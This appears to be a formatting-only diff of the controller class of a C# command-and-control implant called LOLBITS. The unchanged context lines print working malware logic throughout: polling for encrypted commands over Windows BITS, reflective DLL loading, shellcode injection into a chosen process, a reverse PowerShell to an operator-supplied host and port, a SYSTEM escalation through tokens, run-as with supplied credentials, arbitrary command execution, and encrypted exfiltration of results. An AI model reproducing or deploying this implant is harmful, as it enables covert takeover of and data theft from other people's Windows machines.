@@ -12,7 +12,6 @@ using BITS4 = BITSReference4_0;
 
 namespace LOLBITS.Controlling
 {
-
     public class Controller
     {
         private const string ContId = "7061796c676164";
@@ -49,8 +48,7 @@ namespace LOLBITS.Controlling
         }
 
         public void Start()
-        { 
-
+        {
             string startBits = "sc start BITS";
             Utils.ExecuteCommand(startBits);
             Thread.Sleep(500);
@@ -72,7 +70,6 @@ namespace LOLBITS.Controlling
 
                 Loop();
                 
-
                 /*Rectangle bounds = Screen.GetBounds(Point.Empty);
                 using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                 {
@@ -83,9 +80,6 @@ namespace LOLBITS.Controlling
                     bitmap.Save(@"c:\users\pccom\desktop\test.jpg", ImageFormat.Jpeg);
                 }*/
             }
-
-
-
         }
 
         private void Loop()
@@ -111,27 +105,23 @@ namespace LOLBITS.Controlling
                     if (file.Commands.Length > 0)
                         DoSomething(file);
                     
-
-
                     Thread.Sleep(1000);
                 }
                 else
                 {
-
                     if (_restoreKeys.Length > 0)
                     {
                         _auth = _restoreKeys[_restoreKeys.Length - 1];
                         Array.Resize(ref _restoreKeys,_restoreKeys.Length - 1);
                     }
-                    else { exit = true; }
+                    else
+                        exit = true;
                 }
             }
-
         }
 
         private void DoSomething(Content file)
         {
-
             string rps = "";
 
             try
@@ -150,12 +140,14 @@ namespace LOLBITS.Controlling
                                     Assembly dll = LoadDll(fileP);
                                     string method = file.Commands[1];
                                     string args = "";
+
                                     for (int i = 2; i < file.Commands.Length; i++)
                                     {
                                         args += file.Commands[i];
                                         if (i < file.Commands.Length)
                                             args += " ";
                                     }
+
                                     string[] arguments = new string[] { args };
 
                                     LauncherDll.Main(method, arguments, dll);
@@ -171,7 +163,6 @@ namespace LOLBITS.Controlling
                                 rps = "ERR:Dll not found!\n";
                             }
 
-
                             break;
                         }
 
@@ -183,7 +174,6 @@ namespace LOLBITS.Controlling
                             if (file.Commands.Length >= 2)
                                 pid = int.Parse(file.Commands[1]);
 
-
                             if (_jobsManager.Get(_id, fileP, headers, BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_FOREGROUND))
                             {
                                 byte[] sh;
@@ -191,7 +181,6 @@ namespace LOLBITS.Controlling
 
                                 try
                                 {
-
                                     LauncherShellCode.Main(sh, _sysCall, pid);
                                     rps = "Shellcode injected!\n";
                                 }
@@ -216,7 +205,6 @@ namespace LOLBITS.Controlling
                             {
                                 LauncherPowershell.Main(file.Commands[1], file.Commands[2]);
                                 rps = "You should have your Powershell at " + file.Commands[1] + ":" + file.Commands[2] + "!\n";
-
                             }
                             else
                             {
@@ -262,7 +250,6 @@ namespace LOLBITS.Controlling
                         }
                     case "getsystem":
                         {
-
                             if (Utils.IsHighIntegrity(_sysCall))
                                 rps = TokenManager.GetSystem() ? "We are System!\n" : "ERR:Process failed! Is this process running with high integrity level?\n";
                             else
@@ -279,11 +266,11 @@ namespace LOLBITS.Controlling
                             break;
                         }
 
-
                     case "runas":
                         {
                             string user = "", domain = "", password = "";
                             string[] userData = file.Commands[1].Split('\\');
+
                             if (userData.Length == 1)
                             {
                                 domain = ".";
@@ -298,7 +285,6 @@ namespace LOLBITS.Controlling
                             password = file.Commands[2];
 
                             rps = TokenManager.RunAs(domain, user, password) ? "Success!" : "ERR:Invalid credentials.";
-
 
                             break;
                         }
@@ -324,7 +310,6 @@ namespace LOLBITS.Controlling
                             }
 
                             break;
-
                         }
 
                     case "exit":
@@ -338,24 +323,24 @@ namespace LOLBITS.Controlling
                             rps = Utils.ExecuteCommand(file.Commands[0]);
                             break;
                         }
-
-
                 }
-            } catch
+            } 
+            catch
             {
                 rps = "ERR: Something went wrong!";
             }
+
             Response response = new Response(rps, _auth);
             string filePath = _tempPath + @"\" + _id + ".txt";
             EncryptResponseIntoFile(filePath, response);
             TrySend(filePath);
-
         }
 
         private string GetProcessInfo()
         {
             string output = "\n";
             output = string.Concat(output, string.Format("{0,30}|{1,10}|{2,20}|\n", "NAME", "PID", "ACCOUNT"));
+
             foreach (var process in Process.GetProcesses())
             {
                 string name = process.ProcessName;
@@ -363,12 +348,12 @@ namespace LOLBITS.Controlling
 
                 output = string.Concat(output, string.Format("{0,30}|{1,10}|{2,20}|\n", name, processId, GetProcessOwner(processId)));
             }
+
             return output;
         }
 
         private static string GetProcessOwner (int processId)
         {
-
             string query = "Select * From Win32_Process Where ProcessID = " + processId;
             ManagementObjectSearcher moSearcher = new ManagementObjectSearcher(query);
             ManagementObjectCollection moCollection = moSearcher.Get();
@@ -386,6 +371,7 @@ namespace LOLBITS.Controlling
         private bool TrySend(string filePath)
         {
             int cont = 0;
+
             while (cont < 5)
             {
                 if (_jobsManager.Send(_id, filePath))
@@ -394,6 +380,7 @@ namespace LOLBITS.Controlling
                 }
                 ++cont;
             }
+
             return false;
         }
 
@@ -420,12 +407,12 @@ namespace LOLBITS.Controlling
             byte[] content_encrypted = Rc4.Encrypt(xKey, content_decrypted);
             string hexadecimal = BiteArrayToHex.Convert(content_encrypted);
             string fileContent = Zipper.Compress(hexadecimal);
+
             File.WriteAllText(filePath, fileContent);
         }
 
         private Content GetEncryptedFileContent(string filePath, out byte[] decrypted)
         {
-
             string fileStr = File.ReadAllText(filePath);
             byte[] xKey = Encoding.ASCII.GetBytes(_p);
             string hexadecimal = Zipper.Decompress(fileStr);
@@ -439,7 +426,8 @@ namespace LOLBITS.Controlling
                 Content final = JsonConvert.DeserializeObject<Content>(content_encoded);
                 return final;
 
-            } catch
+            }
+            catch
             {
                 return null;
             }
@@ -452,11 +440,10 @@ namespace LOLBITS.Controlling
             string hexadecimal = Zipper.Decompress(fileStr);
             byte[] content_encrypted = StringHexToByteArray.Convert(hexadecimal);
             byte[] content_decrypted = Rc4.Decrypt(xKey, content_encrypted);
+
             Assembly dll = Assembly.Load(content_decrypted);
 
             return dll;
         }
- 
-
     }
 }
